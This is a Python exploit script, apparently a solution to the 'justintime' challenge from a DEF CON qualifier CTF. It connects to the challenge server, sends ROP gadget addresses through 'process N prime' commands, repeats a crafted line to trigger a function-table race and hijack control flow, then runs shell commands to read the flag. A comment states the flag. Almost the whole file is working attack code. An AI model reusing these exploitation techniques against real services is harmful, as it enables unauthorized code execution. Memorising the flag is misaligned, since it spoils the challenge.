from pwnlib import *
import random

# The flag is: G0T it in the __nick__ of time? C++11/Thr3ad/T0C0U31337

def c():
	return s.ru("Enter command: ")

#s = Socket(("localhost", 5553))
s = Socket(("justintime_f09b383db2d33ee22a5a53dc76557388.quals.shallweplayaga.me", 5192))
c()

###

def wake():
	s.send("wake\n")
	c()

def sleep():
	s.send("sleep\n")
	c()

def log_on():
	s.send("log on\n")
	c()

def log_off():
	s.send("log off\n")
	c()


rop = [
	0x8077113,
	0xcafebabe,
	0x80eecef,
	0xcfefefee,
]
s.send("process 1 prime %d %d %d %d\n" % tuple(rop))
rop = [
	0x80eecef,
	0xcafebabe,
	0xcafe1234,
	0xcfefefee,
]
s.send("process 2 prime %d %d %d %d\n" % tuple(rop))
rop = [
	0xdeadbeef,
	0xcafebabe,
	0xcafe1234,
	0xcfefefee,
]
s.send("process 3 prime %d %d %d %d\n" % tuple(rop))


controlled_addr = 0x812b5e0
controlled = 0x805a13a # pc goes here
functab = 0x81284c0
diff = (controlled_addr - functab) / 4



line = "process 4 prime 1 2 3 %d %d\n" % (controlled, diff)

s.send("log on\n")

for _ in range(100):
	s.send(line)

s.send("pwd\n")
s.send("ls -la\n")
s.send("cat flag\n")

print "interacting"
s.interact()
exit()

s.send("log on\n")

s.send("process 1 lcd 373587883 3 3 4 5\n")
s.send("process 2 lcd 373587883 3 3 4 5\n")
s.send("process 3 lcd 373587883 3 3 4 5\n")
s.send("process 4 lcd 373587883 3 3 4 5\n")
time.sleep(2)
for i in range(1, 4+1):
	cmd = "process %d prime " % i
	for j in range(5):
		cmd += chr(0x71 + j)*random.randint(1, 1000) + " "
	print cmd
	s.send(cmd + "\n")
	


print "interacting"
s.interact()
